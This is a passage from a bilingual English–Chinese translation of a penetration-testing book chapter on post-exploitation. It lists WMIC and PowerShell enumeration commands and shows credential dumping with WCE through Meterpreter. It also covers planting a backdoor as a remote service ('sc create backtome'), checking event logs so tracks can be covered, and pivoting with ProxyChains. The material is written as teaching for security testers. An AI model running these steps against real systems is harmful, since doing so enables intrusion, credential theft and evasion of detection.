    (**WMIC**)，这是一种命令行和脚本接口，用于简化访问 Windows 管理工具。如果被攻破的系统支持 WMIC，可以使用多个命令来收集信息。*表 11.7*
    提供了一些命令的简要描述：
- en: '| **Command** | **Description** |'
  id: totrans-215
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **描述** |'
- en: '| --- | --- |'
  id: totrans-216
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| `wmic nicconfig get ipaddress,macaddress` | Obtains the IP address and MAC
    address |'
  id: totrans-217
  prefs: []
  type: TYPE_TB
  zh: '| `wmic nicconfig get ipaddress,macaddress` | 获取 IP 地址和 MAC 地址 |'
- en: '| `wmic computersystem get username` | Verifies the account that was compromised
    |'
  id: totrans-218
  prefs: []
  type: TYPE_TB
  zh: '| `wmic computersystem get username` | 验证被攻破的账户 |'
- en: '| `wmic netlogin get name, lastlogon` | Determines who used this system last
    and when they last logged on |'
  id: totrans-219
  prefs: []
  type: TYPE_TB
  zh: '| `wmic netlogin get name, lastlogon` | 确定最后使用该系统的人和最后登录时间 |'
- en: '| `wmic desktop get screensaversecure, screensavertimeout` | Determines whether
    the screensavers are password protected and what the timeout is |'
  id: totrans-220
  prefs: []
  type: TYPE_TB
  zh: '| `wmic desktop get screensaversecure, screensavertimeout` | 确定屏幕保护程序是否受密码保护以及超时时间
    |'
- en: '| `wmic logon get authenticationpackage` | Determines which logon methods are
    supported |'
  id: totrans-221
  prefs: []
  type: TYPE_TB
  zh: '| `wmic logon get authenticationpackage` | 确定支持哪些登录方法 |'
- en: '| `wmic process get caption, executablepath,commandline` | Identifies system
    processes |'
  id: totrans-222
  prefs: []
  type: TYPE_TB
  zh: '| `wmic process get caption, executablepath,commandline` | 识别系统进程 |'
- en: '| `wmic process where name="process_name" call terminate` | Terminates specific
    processes |'
  id: totrans-223
  prefs: []
  type: TYPE_TB
  zh: '| `wmic process where name="process_name" call terminate` | 终止特定进程 |'
- en: '| `wmic os get name, servicepackmajorversion` | Determines the system’s operating
    system |'
  id: totrans-224
  prefs: []
  type: TYPE_TB
  zh: '| `wmic os get name, servicepackmajorversion` | 确定系统的操作系统 |'
- en: '| `wmic product get name, version` | Identifies installed software |'
  id: totrans-225
  prefs: []
  type: TYPE_TB
  zh: '| `wmic product get name, version` | 识别已安装的软件 |'
- en: '| `wmic product where name="name'' call uninstall /nointeractive` | Uninstalls
    or removes defined software packages |'
  id: totrans-226
  prefs: []
  type: TYPE_TB
  zh: '| `wmic product where name="name'' call uninstall /nointeractive` | 卸载或移除已定义的软件包
    |'
- en: '| `wmic share get /ALL` | Identifies the shares accessible by the user |'
  id: totrans-227
  prefs: []
  type: TYPE_TB
  zh: '| `wmic share get /ALL` | 识别用户可以访问的共享 |'
- en: '| `wmic /node:"machinename" path Win32_TerminalServiceSetting where AllowTSConnections="0"
    call SetAllowTSConnections "1"` | Starts RDP remotely |'
  id: totrans-228
  prefs: []
  type: TYPE_TB
  zh: '| `wmic /node:"machinename" path Win32_TerminalServiceSetting where AllowTSConnections="0"
    call SetAllowTSConnections "1"` | 远程启动 RDP |'
- en: '| `wmicnteventlog get path, filename,writeable` | Finds all of the system event
    logs and ensures that they can be modified (these are used when it is time to
    cover your tracks) |'
  id: totrans-229
  prefs: []
  type: TYPE_TB
  zh: '| `wmicnteventlog get path, filename,writeable` | 查找所有系统事件日志，并确保它们可以被修改（这些在掩盖痕迹时使用）
    |'
- en: 'Table 11.7: WMIC commands that can be leveraged by testers to perform horizontal
    privilege escalation'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 表 11.7：测试人员可以利用的 WMIC 命令以执行水平权限提升
- en: PowerShell is a scripting language built on .NET Framework that runs from a
    console, giving the user access to the Windows filesystem and objects such as
    the registry. It is installed by default on the Windows 7 operating system and
    higher versions. PowerShell extends the scripting support and automation offered
    by WMIC by permitting the use of shell integration and interoperability on both
    local and remote targets.
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 是一种基于 .NET Framework 构建的脚本语言，从控制台运行，给予用户对 Windows 文件系统和注册表等对象的访问权限。它在
    Windows 7 操作系统及更高版本中默认安装。PowerShell 通过允许在本地和远程目标上进行 shell 集成和互操作性，扩展了 WMIC 提供的脚本支持和自动化功能。
- en: PowerShell gives testers access to a shell and scripting language on a compromised
    system. Since it is native to the Windows operating system, its use of commands
    does not trigger antivirus software. When scripts are run on a remote system,
    PowerShell does not write to the disk, thus bypassing any antivirus software and
    whitelisting controls (assuming that the user has permitted the use of PowerShell).
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 为测试人员提供了在被攻击系统上访问 shell 和脚本语言的权限。由于它是 Windows 操作系统的原生工具，使用其命令不会触发防病毒软件。当脚本在远程系统上运行时，PowerShell
    不会写入磁盘，因此可以绕过任何防病毒软件和白名单控制（假设用户已允许使用 PowerShell）。
- en: 'PowerShell supports a number of built-in functions that are referred to as
    cmdlets. One of the advantages of PowerShell is that cmdlets are aliased to common
    Unix commands, so entering the `ls` command will return a typical directory listing,
    as shown in *Figure 11.20*:'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 支持多种内置函数，称为 cmdlet。PowerShell 的一个优势是，cmdlet 与常见的 Unix 命令有别名，因此输入
    `ls` 命令将返回典型的目录列表，如 *图 11.20* 所示：
- en: '![](../Images/B17765_11_20.png)'
  id: totrans-234
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_20.png)'
- en: 'Figure 11.20: Running Linux commands in Windows PowerShell'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.20：在 Windows PowerShell 中运行 Linux 命令
- en: PowerShell is a rich language that’s capable of supporting very complex operations;
    it is recommended that the user spends time becoming familiar with its use. Some
    of the simpler commands that can be used immediately following a compromise are
    described in *Table 11.8:*
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 是一种功能强大的语言，能够支持非常复杂的操作；建议用户花时间熟悉其使用。以下是在受感染后可以立即使用的一些简单命令，详见 *表 11.8：*
- en: '| **Command** | **Description** |'
  id: totrans-237
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **描述** |'
- en: '| `Get-Host &#124; Select Version` | Identifies the version of PowerShell that’s
    being used by the victim’s system. Some cmdlets are added or invoked in different
    versions. |'
  id: totrans-238
  prefs: []
  type: TYPE_TB
  zh: '| `Get-Host &#124; Select Version` | 识别受害者系统正在使用的 PowerShell 版本。某些 cmdlet 会在不同版本中被添加或调用。
    |'
- en: '| `Get-Hotfix` | Identifies the installed security patches and system hotfixes.
    |'
  id: totrans-239
  prefs: []
  type: TYPE_TB
  zh: '| `Get-Hotfix` | 识别已安装的安全补丁和系统热修复。 |'
- en: '| `Get-Acl` | Identifies the group names and usernames. |'
  id: totrans-240
  prefs: []
  type: TYPE_TB
  zh: '| `Get-Acl` | 识别组名和用户名。 |'
- en: '| `Get-Process, Get-Service` | Lists the current processes and services. |'
  id: totrans-241
  prefs: []
  type: TYPE_TB
  zh: '| `Get-Process, Get-Service` | 列出当前的进程和服务。 |'
- en: '| `gwmi win32_useraccount` | Invokes WMI to list the user accounts. |'
  id: totrans-242
  prefs: []
  type: TYPE_TB
  zh: '| `gwmi win32_useraccount` | 调用 WMI 列出用户账户。 |'
- en: '| `Gwmi_win32_group` | Invokes WMI to list the SIDs, names, and domain groups.
    |'
  id: totrans-243
  prefs: []
  type: TYPE_TB
  zh: '| `Gwmi_win32_group` | 调用 WMI 列出 SID、名称和域组。 |'
- en: 'Table 11.8: Inbuilt PowerShell commands that can be utilized to perform local
    system enumeration'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 表 11.8：可用于执行本地系统枚举的内置 PowerShell 命令
- en: 'Penetration testers can use Windows native commands, DLLs, .NET functions,
    WMI calls, and PowerShell cmdlets together to create PowerShell scripts with the
    `.ps1` extension. One such example of lateral movement using WMIC using credentials
    is when an attacker runs a process on the remote machine to dump a plaintext password
    from memory. The command to be utilized is as follows:'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试人员可以使用 Windows 原生命令、DLL、.NET 函数、WMI 调用和 PowerShell cmdlet，将它们组合在一起创建 `.ps1`
    扩展名的 PowerShell 脚本。一个使用 WMIC 和凭据进行横向移动的例子是，攻击者在远程机器上运行一个进程，从内存中提取明文密码。要使用的命令如下：
- en: '[PRE5]'
  id: totrans-246
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Reconnaissance should also extend to the local network. Since you are working
    blind, you will need to create a map of live systems and subnets that the compromised
    host can communicate with. Start by entering `IFCONFIG` (Unix-based systems) or
    `IPCONFIG /ALL` (Windows systems) in the shell prompt. This will allow an attacker
    to determine the following:'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 侦察工作还应扩展到本地网络。由于你是在盲目操作，你需要创建一个与受感染主机可以通信的实时系统和子网的映射。首先，在 shell 提示符下输入 `IFCONFIG`（基于
    Unix 的系统）或 `IPCONFIG /ALL`（Windows 系统）。这将允许攻击者确定以下信息：
- en: Whether DHCP addressing is enabled.
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否启用了 DHCP 地址分配。
- en: The local IP address, which will also identify at least one active subnet.
  id: totrans-249
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 本地 IP 地址，这也会识别至少一个活动子网。
- en: The gateway IP address and DNS server address. System administrators usually
    follow a numbering convention across the network, and if an attacker knows one
    address, such as gateway server `10.10.10.1`, they will ping addresses such as
    `10.10.10.100`, `10.10.10.5`, and so on to find additional subnets.
  id: totrans-250
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 网关IP地址和DNS服务器地址。系统管理员通常在整个网络中遵循编号约定，如果攻击者知道一个地址，例如网关服务器`10.10.10.1`，他们会ping其他地址，如`10.10.10.100`，`10.10.10.5`等，以查找额外的子网。
- en: The domain name that’s used to leverage Active Directory accounts.
  id: totrans-251
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用于利用Active Directory账户的域名。
- en: If the attacking system and the target system are using Windows, the `net view`
    command can be used to enumerate other Windows systems on the network. Attackers
    use the `netstat -rn` command to review the routing table, which may contain static
    routes to networks or systems of interest.
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击系统和目标系统都在使用Windows，可以使用`net view`命令枚举网络上的其他Windows系统。攻击者使用`netstat -rn`命令来查看路由表，其中可能包含对感兴趣的网络或系统的静态路由。
- en: The local network can be scanned using `nmap`, which sniffs for ARP broadcasts.
    In addition, Kali has several tools that can be used for SNMP endpoint analysis,
    including `nmap`, `onesixtyone`, and `snmpcheck`.
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 可以使用`nmap`扫描本地网络，该工具会嗅探ARP广播。此外，Kali还有几个工具可用于SNMP端点分析，包括`nmap`、`onesixtyone`和`snmpcheck`。
- en: 'Deploying a packet sniffer to map traffic will help you identify hostnames,
    active subnets, and domain names. If DHCP addressing is not enabled, it will also
    allow attackers to identify any unused, static IP addresses. Kali is preinstalled
    with Wireshark (a GUI-based packet sniffer), but you can also use `tshark` in
    a post-exploitation script or from the command line, as shown in *Figure 11.21*:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 部署数据包嗅探器以映射流量将帮助您识别主机名、活动子网和域名。如果未启用DHCP寻址，还将允许攻击者识别未使用的静态IP地址。Kali预装了Wireshark（基于GUI的数据包嗅探器），但您也可以从命令行或后渗透脚本中使用`tshark`，如图11.21所示：
- en: '![](../Images/B17765_11_21.png)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_21.png)'
- en: 'Figure 11.21: Running tshark to sniff the network and identify the hosts'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.21：运行tshark来嗅探网络并识别主机
- en: Windows Credentials Editor
  id: totrans-257
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Windows凭证编辑器
- en: '**Windows Credentials Editor** (**WCE**) can be downloaded from [https://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/).'
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: '**Windows Credentials Editor** (**WCE**)可以从[https://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)下载。'
- en: 'Using the Meterpreter shell, you can upload `wce.exe` to the system that has
    been compromised, as shown in *Figure 11.22*. Once the file has been uploaded
    to the system, run the `shell` command in the Meterpreter session; this will grant
    terminal access to the compromised system. To validate if WCE is successful, run
    `wce.exe -w` to list all of the user’s login sessions, along with a plaintext
    password:'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Meterpreter shell，您可以将`wce.exe`上传到已被入侵的系统，如图11.22所示。一旦文件上传到系统，运行Meterpreter会话中的`shell`命令，这将授予对被入侵系统的终端访问。要验证WCE是否成功，请运行`wce.exe
    -w`以列出所有用户的登录会话及明文密码：
- en: '![](../Images/B17765_11_22.png)'
  id: totrans-260
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_22.png)'
- en: 'Figure 11.22: Extracting plaintext passwords using WCE on legacy Windows devices'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.22：在旧版Windows设备上使用WCE提取明文密码
- en: Later, these credentials can be utilized by the attackers to laterally move
    into the network, thus utilizing the same credentials on multiple systems. This
    tool will work only on legacy systems such as Windows XP, 2003, 7, and 2008.
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 稍后，攻击者可以利用这些凭据横向移动到网络中，从而在多个系统上使用相同的凭据。此工具仅适用于Windows XP、2003、7和2008等旧系统。
- en: Penetration testers can heavily utilize PowerShell’s automated Empire tool to
    perform attacks that are specific to Active Directory and other domain trust and
    privilege escalation attacks, which we will explore in *Chapter 12*, *Privilege
    Escalation*.
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试人员可以大量使用PowerShell的自动化Empire工具来执行特定于Active Directory和其他域信任和提权攻击，我们将在*第12章*，*特权提升*中探讨这些攻击。
- en: Lateral movement using services
  id: totrans-264
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用服务进行横向移动
- en: What if penetration testers encounter a system with no PowerShell to invoke?
    During such cases, **Service Controls** (**SCs**) will be very handy for performing
    lateral movement in the network for all of the systems that you have access to
    or systems with anonymous access to the shared folder.
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 如果渗透测试人员遇到没有PowerShell可调用的系统怎么办？在这种情况下，**服务控制**（**SCs**）将非常有用，用于在网络中执行横向移动，涵盖所有您访问或具有匿名访问共享文件夹的系统。
- en: 'The following commands can be run directly from Command Prompt or through the
    Meterpreter shell:'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 以下命令可以直接从命令提示符或通过Meterpreter shell运行：
- en: '`net use \\advanced\c$/user:advanced\username password`'
  id: totrans-267
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`net use \\advanced\c$/user:advanced\username password`'
- en: '`dir \\advanced\c$`'
  id: totrans-268
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`dir \\advanced\c$`'
- en: Copy the backdoor that’s been created using Shellter or Veil to the shared folder
  id: totrans-269
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 将使用Shellter或Veil创建的后门复制到共享文件夹中
- en: Create a service called `backtome`
  id: totrans-270
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 创建一个名为`backtome`的服务
- en: '`Sc \\remotehost create backtome binpath="c:\xx\malware.exe"`'
  id: totrans-271
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Sc \\remotehost create backtome binpath="c:\xx\malware.exe"`'
- en: '`Sc remotehost start backtome`'
  id: totrans-272
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Sc remotehost start backtome`'
- en: Pivoting and port forwarding
  id: totrans-273
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 转向和端口转发
- en: We discussed simple ways to port forward the connection in *Chapter 9*, *Bypassing
    Security Controls*, by bypassing content filtering and NAC. In this section, we
    will use Metasploit’s Meterpreter to pivot and port forward on the targets.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在*第9章*《绕过安全控制》中讨论了简单的端口转发方法，通过绕过内容过滤和NAC。在本节中，我们将使用Metasploit的Meterpreter来进行转向和端口转发目标。
- en: 'In Meterpreter, during an active session on the target systems, attackers can
    use the same system to scan the internal network. *Figure 11.23* shows a system
    with two network adapters, `192.168.0.119` and `192.168.52.129`:'
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 在Meterpreter上，在目标系统上的活动会话期间，攻击者可以使用相同的系统扫描内部网络。图11.23显示了一个具有两个网络适配器`192.168.0.119`和`192.168.52.129`的系统：
- en: '![](../Images/B17765_11_23.png)'
  id: totrans-276
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_23.png)'
- en: 'Figure 11.23: Identifying if the compromised target has two different network
    adapters'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: '图 11.23: 确定受损目标是否有两个不同的网络适配器'
- en: 'However, there is no route for the attacker’s IP to reach the internal IP ranges;
    penetration testers with the Meterpreter session will be able to add the route
    of the compromised system by running the post-exploit module autoroute by running
    `run post/multi/manage/autoroute` in Meterpreter, as shown in *Figure 11.24*.
    This module will add a new route from the Kali attack box to the internal network
    by using the compromised machine as the bridge:'
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，攻击者的IP没有到达内部IP范围的路由；渗透测试人员在Meterpreter会话中可以通过运行后期利用模块`run post/multi/manage/autoroute`在受损系统上添加从Kali攻击框到内部网络的新路由，如图11.24所示。此模块将使用受损机作为桥梁：
- en: '![](../Images/B17765_11_24.png)'
  id: totrans-279
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_24.png)'
- en: 'Figure 11.24: Adding autoroute to Kali Linux from the compromised target using
    post-exploitation modules'
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: '图 11.24: 使用后期利用模块从受损目标向Kali Linux添加自动路由'
- en: All of the traffic from the attacker’s IP to the internal IP range (`192.168.0.52.x`)
    will now be routed through the compromised system (`192.168.0.x`).
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 所有从攻击者IP到内部IP范围 (`192.168.0.52.x`) 的流量现在将通过受损系统 (`192.168.0.x`) 路由。
- en: 'We will now run the Meterpreter session in the background and try to understand
    what is beyond the IP range, while also making use of the port scanner from Metasploit,
    but utilizing the following module:'
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们将在后台运行Meterpreter会话，并尝试理解IP范围之外的情况，同时还要利用Metasploit的端口扫描器，但要使用以下模块：
- en: '[PRE6]'
  id: totrans-283
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'To verify that our Kali Linux certainly has the ability to reach the target
    network, you set RHOSTS as the default gateway IP of the second adapter. This
    will enable the attackers to find services on the hopping network and devices;
    a typical move would be to utilize the port scanner in the Metasploit module,
    as shown in *Figure 11.25*:'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 要验证我们的Kali Linux确实具备访问目标网络的能力，您可以将RHOSTS设置为第二个适配器的默认网关IP。这将使攻击者能够找到跳跃网络和设备上的服务；典型的做法是利用Metasploit模块中的端口扫描器，如图11.25所示：
- en: '![](../Images/B17765_11_25.png)'
  id: totrans-285
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_25.png)'
- en: 'Figure 11.25: Running portscan after adding autoroute to a hopping network'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: '图 11.25: 在跳跃网络添加自动路由后运行端口扫描'
- en: Using ProxyChains
  id: totrans-287
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用ProxyChains
- en: 'Penetration testers who want to use `nmap` and other tools to scan the hosts
    beyond the network can utilize the Metasploit module `socks4a` by running the
    following code in the Metasploit `post` module:'
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 希望使用`nmap`和其他工具扫描网络主机的渗透测试人员可以通过在Metasploit的`post`模块中运行以下代码来利用Metasploit模块`socks4a`：
- en: '[PRE7]'
  id: totrans-289
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Configure the ProxyChains configuration after running the module by editing
    `/etc/proxychains.conf` and updating the `socks4` configuration to port `1080`
    (or the port number you set in the Metasploit module), as shown in *Figure 11.26*:'
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行模块后通过编辑`/etc/proxychains.conf`配置ProxyChains配置，并将`socks4`配置更新到端口`1080`（或您在Metasploit模块中设置的端口号），如图11.26所示：
- en: '![](../Images/B17765_11_26.png)'
  id: totrans-291
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_26.png)'
- en: 'Figure 11.26: Updating the socks4 configuration to port 1080'
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: '图 11.26: 更新socks4配置以使用端口1080'
- en: Now, the attackers will be able to run `nmap` directly by running `proxychains
    nmap -vv -sV 192.168.1.254` from the terminal. We have learned how to utilize
    ProxyChains to perform network scanning to maintain anonymity.
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，攻击者可以通过终端直接运行`nmap`，命令为`proxychains nmap -vv -sV 192.168.1.254`。我们已经学习了如何利用ProxyChains执行网络扫描以保持匿名性。
- en: Summary
  id: totrans-294
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: In this chapter, we focused on the immediate actions that follow the exploitation
    of a target system. We reviewed the initial rapid assessment that’s conducted
    to characterize the server and the local environment. We also learned how to use
    various post-exploitation tools to locate target files of interest, create user
    accounts, and perform horizontal escalation to harvest more information that’s
    specific to other users. We focused on Metasploit’s Meterpreter usage, the PowerShell
    Empire tool, and CrackMapExec so that we could collect more information to perform
    lateral movement and privilege attacks.
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们重点讨论了目标系统利用后的即时操作。我们回顾了进行快速初步评估的过程，以便对服务器和本地环境进行特征描述。我们还学习了如何使用各种后期利用工具定位感兴趣的目标文件、创建用户帐户，并进行横向提升以收集更多与其他用户相关的信息。我们重点介绍了Metasploit的Meterpreter使用方法、PowerShell
    Empire工具以及CrackMapExec，以便我们能够收集更多信息，执行横向移动和特权攻击。
- en: In the next chapter, we will learn how to escalate privileges from that of a
    normal user to the highest level possible, and also exploit the weaknesses that
    can be found in an Active Directory environment.
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将学习如何将特权从普通用户提升到最高级别，并利用在Active Directory环境中发现的漏洞。
